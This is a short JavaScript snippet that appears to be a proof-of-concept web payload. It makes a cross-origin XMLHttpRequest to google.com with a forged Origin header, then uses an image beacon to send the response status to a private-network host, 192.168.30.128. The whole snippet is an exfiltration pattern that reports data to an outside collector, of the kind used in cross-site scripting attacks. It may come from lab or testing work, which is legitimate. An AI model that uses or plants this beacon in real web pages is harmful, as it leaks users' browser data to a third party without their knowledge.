var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.google.com");
xhr.setRequestHeader("Origin", "www.google.com");
xhr.onreadystatechange = function () {
	if (xhr.readyState === 4) {
		var img = new Image();
		img.src = "http://192.168.30.128/hello.txt?x=" + xhr.status;
	}
};
xhr.send();
